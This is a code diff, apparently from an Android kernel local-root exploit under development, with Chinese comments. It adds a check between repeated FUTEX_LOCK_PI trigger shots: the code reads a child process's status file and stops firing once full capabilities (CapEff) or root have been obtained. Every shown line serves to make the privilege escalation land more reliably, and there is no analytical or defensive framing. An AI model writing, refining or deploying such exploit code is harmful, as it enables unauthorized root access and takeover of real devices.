@@ -318,6 +318,36 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
      * 间隔 20ms (JoinChang 循环思想; 原版只打一发, 命中率低) */
     int trig_hits = 0;
     for (int ti = 0; ti < 6; ti++) {
+      /* mt51: 发间落地检测 (补 CRASH_HEALTHY_ENV 暴露的裁定洞). 我的 crash#2
+       * 裁定只覆盖了 RETRY>1 和 sched_setattr 时序, 漏了这里: 6 连发的后半程
+       * 仍对可能已中毒的 f_pi_target 树做 FUTEX_LOCK_PI (waiter INSERT +
+       * rebalance) = crash#2 定罪机制在单 attempt 内复现. 目标子进程持续刷
+       * 状态文件 (CapEff 源自 real_cred, R 落地即刻满帽); 发间 (间隔 20ms,
+       * 单发本身阻塞 50ms, 此读 ~0.1ms) 检查: 满帽或 root_seen → 写已落地
+       * → 弃打剩余发次. 外部模式 (PSELECT_TASK) 同样适用: 文件来自上一轮. */
+      if (ti > 0) {
+        int cfd = open("/data/local/tmp/mt49_child_status.txt", O_RDONLY);
+        if (cfd >= 0) {
+          char sbuf[256];
+          ssize_t sn = read(cfd, sbuf, sizeof(sbuf) - 1);
+          close(cfd);
+          if (sn > 0) {
+            sbuf[sn] = 0;
+            unsigned long long s_cap = 0;
+            int s_root = 0;
+            char *cp = strstr(sbuf, "CapEff=");
+            if (cp) s_cap = strtoull(cp + 7, NULL, 16);
+            char *rp = strstr(sbuf, "root_seen=");
+            if (rp) s_root = atoi(rp + 10);
+            if (s_cap >= 0x000001ffffffffffULL || s_root) {
+              pr_info("mt51: mid-burst landing (CapEff=%016llx root=%d)"
+                      " - abort shots ti=%d\n", s_cap, s_root, ti);
+              fflush(stdout);
+              break;
+            }
+          }
+        }
+      }
       struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
       errno = 0;
       long fret = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
